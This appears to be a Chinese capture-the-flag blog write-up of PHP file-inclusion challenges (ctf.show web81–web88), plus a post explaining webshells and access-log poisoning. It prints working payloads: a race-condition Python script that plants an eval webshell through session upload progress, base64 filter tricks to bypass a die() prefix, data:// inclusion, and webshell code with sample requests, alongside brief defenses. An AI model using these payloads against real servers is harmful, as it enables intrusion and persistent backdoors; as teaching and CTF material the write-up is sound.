class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>也可以直接大小写绕过</p><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>可以不用伪协议，开始写马</p><p>在响应头的server中看见服务器为nginx，包含 nginx 访问日志记录：<strong>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong></p><p>Apache 默认的 combined 日志格式会 原样记录 User-Agent 字符串，不会进行 URL 解码或过滤特殊字符。所以我们改UA。直接添加<?php eval($_GET[2]);?></p><p>get改成**?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&amp;2&#x3D;system(‘tac fl0g.php’);**抓个get包，复制第一行替换原日志第一行即可获得flag</p><h3 id="web82-条件竞争"><a href="#web82-条件竞争" class="headerlink" title="web82(条件竞争)"></a>web82(条件竞争)</h3><p>过滤了.</p><p>php中唯一能控制的无后缀的只有session文件</p><p><img src="/%5Cimages%5Cweb82-1.png"></p><p>如果从cookie里添加PHPSESSID，值为aaa，临时目录下会生成文件**&#x2F;tmp&#x2F;sess_aaa**。</p><p>控制文件内容用参数<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>(获取实时文件上传进度)</p><p>如PHP_SESSION_UPLOAD_PROGRESS&#x3D;”3” &#x3D;&gt; sess_aaa&#x3D;3</p><p><strong>file_put_contents() 函数</strong>：</p><ul><li>这是PHP的一个内置函数</li><li>作用：将内容写入文件（类似保存文件的操作）</li><li>语法：<code>file_put_contents(文件名, 要写入的内容)</code></li><li>示例：<code>file_put_contents(&#39;test.txt&#39;, &#39;Hello World&#39;)</code> 会创建一个test.txt文件，内容为”Hello World”</li></ul><p>写脚本（<strong>已经考虑到了先销毁再包含的情况）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br>data = &#123; <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br><span class="hljs-comment"># read()中需要post的内容</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res = session.post(url,<br>            data=&#123;<br>            <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>        <span class="hljs-comment"># 改参数的值就是/tmp/sess_rikka文件的内容</span><br>            &#125;,<br>            cookies=&#123;<br>            <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid<br>            &#125;,<br>            files=&#123;<br>            <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>            )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        res1 = session.post(url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid, data=data, cookies=&#123; <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid &#125;)<br>        res2 = session.get(url+<span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event() <span class="hljs-comment"># 开启多线程的对象</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>): <span class="hljs-comment"># 开5个线程</span><br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    event.<span class="hljs-built_in">set</span>()<br><br></code></pre></td></tr></table></figure><p>50KB文件确保上传时间足够长（约几秒），这样攻击者有时间在文件被清空前利用它 </p><p>结果是+++done+++，说明成功，访问&#x2F;2.php，</p><p><img src="/%5Cimages%5Cweb82-2.png"></p><p>尝试post</p><p><img src="/%5Cimages%5Cweb82-3.png"></p><p>成功。下面详细讲解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于发送HTTP请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 用于多线程操作</span><br><span class="hljs-keyword">import</span> io  <span class="hljs-comment"># 用于创建内存中的文件对象</span><br><br><span class="hljs-comment"># 目标网站的URL</span><br>url = <span class="hljs-string">&quot;http://e49655b6-8783-497c-a049-8daf3c8e02dc.challenge.ctf.show/&quot;</span><br><br><span class="hljs-comment"># 自定义的Session ID，用于控制Session文件名</span><br>sessionid = <span class="hljs-string">&#x27;ctfshow&#x27;</span><br><br><span class="hljs-comment"># 要执行的恶意PHP代码</span><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>: <span class="hljs-string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>data 解释</strong>：</p><ul><li><code>&quot;1&quot;</code>：这是POST参数名</li><li>值是一个PHP代码字符串：<code>file_put_contents(&#39;/var/www/html/2.php&#39;,&#39;&lt;?php eval($_POST[2]);?&gt;&#39;);</code></li><li>这行代码的意思是：在服务器的<code>/var/www/html/</code>目录创建<code>2.php</code>文件</li><li>文件内容：<code>&lt;?php eval($_POST[2]);?&gt;</code>（这是一个Webshell）</li><li><code>eval($_POST[2])</code> 表示执行通过POST参数<code>2</code>发送的任何PHP代码</li></ul><hr><h4 id="写线程函数（负责污染Session文件）"><a href="#写线程函数（负责污染Session文件）" class="headerlink" title="写线程函数（负责污染Session文件）"></a>写线程函数（负责污染Session文件）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-comment"># 创建一个50KB大小的&quot;假文件&quot;（内容全是字母a）</span><br>    fileBytes = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 发送POST请求上传文件</span><br>        res = session.post(<br>            url,  <span class="hljs-comment"># 目标URL</span><br>            <br>            <span class="hljs-comment"># POST数据部分</span><br>            data=&#123;<br>                <span class="hljs-comment"># 关键！这个值会被写入Session文件</span><br>                <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># Cookie设置</span><br>            cookies=&#123;<br>                <span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid  <span class="hljs-comment"># 设置Session ID</span><br>            &#125;,<br>            <br>            <span class="hljs-comment"># 上传的文件</span><br>            files=&#123;<br>                <span class="hljs-comment"># 文件字段名：&#x27;file&#x27;</span><br>                <span class="hljs-comment"># 文件名：&#x27;ctfshow.jpg&#x27;</span><br>                <span class="hljs-comment"># 文件内容：50KB的&#x27;a&#x27;</span><br>                <span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;ctfshow.jpg&#x27;</span>, fileBytes)<br>            &#125;<br>        )<br></code></pre></td></tr></table></figure><p><strong>为什么需要大文件？</strong></p><ul><li>PHP只在上传过程中保持Session文件打开</li><li>50KB文件确保上传时间足够长（约几秒）</li><li>这样攻击者有时间在文件被清空前利用它</li></ul><p><strong>Session文件如何被污染？</strong></p><ol><li>设置Cookie: <code>PHPSESSID=ctfshow</code></li><li>开始上传文件</li><li>PHP自动创建文件：<code>/tmp/sess_ctfshow</code></li><li>将<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值写入该文件</li><li>文件内容变为：<code>upload_progress_&lt;?php eval($_POST[1]);?&gt;</code></li></ol><hr><h4 id="读线程函数（负责执行恶意代码）"><a href="#读线程函数（负责执行恶意代码）" class="headerlink" title="读线程函数（负责执行恶意代码）"></a>读线程函数（负责执行恶意代码）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 无限循环</span><br>        <span class="hljs-comment"># 第一步：触发文件包含漏洞执行恶意代码</span><br>        res1 = session.post(<br>            <span class="hljs-comment"># 利用文件包含漏洞：?file=/tmp/sess_ctfshow</span><br>            url + <span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessionid,<br>            <br>            <span class="hljs-comment"># 发送要执行的代码</span><br>            data=data,  <span class="hljs-comment"># 就是前面定义的创建Webshell的代码</span><br>            <br>            cookies=&#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>: sessionid&#125;  <span class="hljs-comment"># 保持同一个Session</span><br>        )<br>        <br>        <span class="hljs-comment"># 第二步：检查Webshell是否创建成功</span><br> <br>        res2 = session.get(url + <span class="hljs-string">&#x27;2.php&#x27;</span>)<br>        <br>        <span class="hljs-comment"># 如果返回200状态码，说明文件存在</span><br>        <span class="hljs-keyword">if</span> res2.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++done+++&quot;</span>)  <span class="hljs-comment"># 成功提示</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res2.status_code)  <span class="hljs-comment"># 打印错误代码</span><br></code></pre></td></tr></table></figure><p><strong>攻击链解析</strong>：</p><ol><li>请求包含Session文件：<code>?file=/tmp/sess_ctfshow</code></li><li>服务器执行该文件中的PHP代码：<code>eval($_POST[1])</code></li><li><code>$_POST[1]</code>的值是我们发送的：<code>file_put_contents(...)</code></li><li>所以实际执行：<code>file_put_contents(&#39;/var/www/html/2.php&#39;, &#39;&lt;?php eval($_POST[2]);?&gt;&#39;)</code></li><li>在网站根目录创建<code>2.php</code>，内容为Webshell代码</li></ol><hr><h4 id="多线程主程序"><a href="#多线程主程序" class="headerlink" title="多线程主程序"></a>多线程主程序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    event = threading.Event()  <span class="hljs-comment"># 线程事件对象（实际未使用）</span><br>    <br>    <span class="hljs-comment"># 创建持久会话（自动管理cookies）</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-comment"># 启动5个写线程</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <br>        <span class="hljs-comment"># 启动5个读线程</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    <br>    event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 设置事件（实际未使用）</span><br></code></pre></td></tr></table></figure><p><strong>为什么需要多线程？</strong>（<strong>就算先删除临时目录再包含，也可以写进去shell</strong>)</p><ol><li><strong>竞争条件</strong>：Session文件在上传结束后会被PHP清空</li><li>写线程不断创建&#x2F;更新Session文件</li><li>读线程不断尝试在文件被清空前包含它</li><li>多个线程增加成功率（类似不断尝试开锁）</li></ol><hr><h3 id="Webshell使用示例"><a href="#Webshell使用示例" class="headerlink" title="Webshell使用示例"></a>Webshell使用示例</h3><p>成功创建<code>2.php</code>后，攻击者可以发送：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/2.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>目标网站<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-ini"><span class="hljs-attr">2</span>=system(<span class="hljs-string">&quot;ls -la /&quot;</span>)<span class="hljs-comment">;</span></span><br></code></pre></td></tr></table></figure><p><strong>结果</strong>：</p><ul><li>服务器会执行<code>ls -la /</code>（列出根目录所有文件）</li><li>返回结果给攻击者</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br>...<br>total 123<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 .<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 ..<br>-rw-r--r--  1 root root    148 Aug 17  2022 .bashrc<br>...<br></code></pre></td></tr></table></figure><hr><h3 id="为什么这个攻击有效？"><a href="#为什么这个攻击有效？" class="headerlink" title="为什么这个攻击有效？"></a>为什么这个攻击有效？</h3><ol><li><p><strong>Session文件可控</strong>：</p><ul><li>唯一无需后缀即可写入PHP代码的地方</li><li>通过<code>PHP_SESSION_UPLOAD_PROGRESS</code>控制内容</li></ul></li><li><p><strong>文件包含漏洞</strong>：</p><ul><li>网站有类似<code>include($_GET[&#39;file&#39;])</code>的代码</li><li>允许读取<code>/tmp/sess_xxx</code>文件</li></ul></li><li><p><strong>时间窗口利用</strong>：</p><ul><li>大文件上传延长Session文件存在时间</li><li>多线程不断尝试利用这个时间窗口</li></ul></li></ol><hr><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li><p>关闭危险功能：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; php.ini 配置</span><br><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure></li><li><p>限制文件包含：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不要直接包含用户输入</span><br><span class="hljs-variable">$allowed</span> = [<span class="hljs-string">&#x27;header.php&#x27;</span>, <span class="hljs-string">&#x27;footer.php&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>], <span class="hljs-variable">$allowed</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>设置open_basedir：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 限制PHP可访问的目录</span><br><span class="hljs-attr">open_basedir</span> = /var/www/html:/tmp<br></code></pre></td></tr></table></figure></li><li><p>Session文件隔离：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 为每个用户设置独立Session目录</span><br><span class="hljs-attr">session.save_path</span> = <span class="hljs-string">&quot;/var/lib/php/sessions&quot;</span><br></code></pre></td></tr></table></figure></li></ol><p>这个攻击利用了PHP的多个特性和配置默认值，通过精心构造的请求在服务器上创建后门。理解每个步骤对于防御此类攻击至关重要。</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>需要用GET传入一个参数file和用POST传入一个参数content，后面是对file参数内容的过滤</p><p>file_put_contents(urldecode($file), “<?php die(‘大佬别秀了’);?>”.$content);</p><ul><li>使用<code>file_put_contents</code>函数将字符串写入到由<code>$file</code>指定的文件中。在写入之前，<code>$file</code>经过了<code>urldecode</code>函数处理，这意味着如果文件名是URL编码的，它会被解码。写入的内容首先是<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>，这是一个PHP脚本，当文件被作为PHP执行时会立即终止执行并显示消息”大佬别秀了”。然后是变量<code>$content</code>的值。</li></ul><p>那么 file_put_contents 函数，将会往 $file 里写入 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 和我们 post 传入的 $content 内容。</p><p>这时候我们可以想到file参数被过滤了很多东西，所以我们可以在content参数中传入一句话木马，但由于会同时写入一个die指令，这时候就需要我们去绕过这个死亡函数了</p><p>由于这里 url 传入的内容本身会进行一次 url 解码，题目中还使用了一个 urldecode 函数，因此 file 传入的内容需要先经过两次 url 编码再传入。</p><p>content是写入内容,要进行base64编码  对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了）（aaPD9waHAgc3lzdGVtKCdscycpOz8+）11是补给前面的 （结果就是phpdie11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;（四个一组））</p><p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</p><p>进行二次编码后得到:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">file</spanbr></code></pre></td></tr></table></figure><p>对 webshell 进行 base64 编码：</p><p>webshell：<code>&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;</code></p><p>编码后得到:<br>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</p><p>注意我们还需要加两个合法字符让前面 base64 解码成功，这里多传入两个1。</p><p>post 传入：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">content</span><span class="hljs-operator">=</span><span class="hljs-number">11</span>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg<span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>然后调用shell.php，传入cmd</p><p><img src="/%5Cimages%5Cweb87.png"></p><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; &gt;?<br></code></pre></td></tr></table></figure><p>用伪协议：</p><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64_encode_shell]</p><p><img src="/%5Cimages%5Cweb88-1.png"></p><p>改成base64后没有被过滤的符号的，可以添加echo ‘a’或者&gt;末尾任意添加</p><p><img src="/%5Cimages%5Cweb88-2.png"></p><p>即可得到flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shell</title>
    <link href="/2025/06/06/shell/"/>
    <url>/2025/06/06/shell/</url>
    
    <content type="html"><![CDATA[<h3 id="深入详解：WebShell-与日志文件包含攻击"><a href="#深入详解：WebShell-与日志文件包含攻击" class="headerlink" title="深入详解：WebShell 与日志文件包含攻击"></a>深入详解：WebShell 与日志文件包含攻击</h3><h4 id="一、什么是-WebShell？"><a href="#一、什么是-WebShell？" class="headerlink" title="一、什么是 WebShell？"></a>一、什么是 WebShell？</h4><p><strong>WebShell 本质</strong>：<br>一个隐藏在网站服务器上的恶意脚本文件，攻击者通过浏览器就能远程控制服务器，就像在服务器内部安装了”遥控器”。</p><p><strong>典型 WebShell 代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>访问方式：<code>http://target.com/shell.php?cmd=ls</code></li><li>效果：服务器会执行<code>ls</code>命令并返回结果</li></ul><p><strong>WebShell 的作用</strong>：</p><ol><li>执行系统命令（查看文件、修改配置）</li><li>上传&#x2F;下载文件</li><li>数据库操作</li><li>内网渗透跳板</li><li>持久化后门（即使漏洞修复仍能控制）</li></ol><h4 id="二、你提供的攻击流程详解"><a href="#二、你提供的攻击流程详解" class="headerlink" title="二、你提供的攻击流程详解"></a>二、你提供的攻击流程详解</h4><h5 id="完整攻击步骤："><a href="#完整攻击步骤：" class="headerlink" title="完整攻击步骤："></a>完整攻击步骤：</h5><pre><code class=" mermaid">graph TDA[污染日志] --&gt; B[包含日志]B --&gt; C[执行代码]C --&gt; D[获取WebShell]D --&gt; E[完全控制服务器]</code></pre><h5 id="详细解析："><a href="#详细解析：" class="headerlink" title="详细解析："></a>详细解析：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure><p><strong>步骤分解</strong>：</p><ol><li><p><strong>污染日志（植入代码）</strong><br>首先需要让日志包含PHP代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/&lt;?php</span> $_<span class="hljs-keyword">GET</span>[&#x27;2&#x27;]);?&gt; <span class="hljs-string">HTTP/1.1</span><br><span class="hljs-string">Host:</span> target.com<br></code></pre></td></tr></table></figure><p>日志会记录：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">[2025-06-11] &quot;GET /</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 404 ...</span><br></code></pre></td></tr></table></figure></li><li><p><strong>触发代码执行</strong><br>访问包含漏洞页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">target.com/vuln.php?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();<br></code></pre></td></tr></table></figure></li><li><p><strong>服务器实际执行的代码</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /var/www/html/fl0g.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>system(&#39;tac ...&#39;)</code>：执行系统命令读取flag文件</li><li><code>phpinfo()</code>：输出PHP配置信息</li></ul></li><li><p><strong>结果定位技巧</strong>：<br>在返回的网页中：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">FLAG</span><span class="hljs-template-variable">&#123;this_is_secret&#125;</span><span class="language-xml">  &lt;-- 命令执行结果</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>       &lt;-- phpinfo()的起始标签</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span 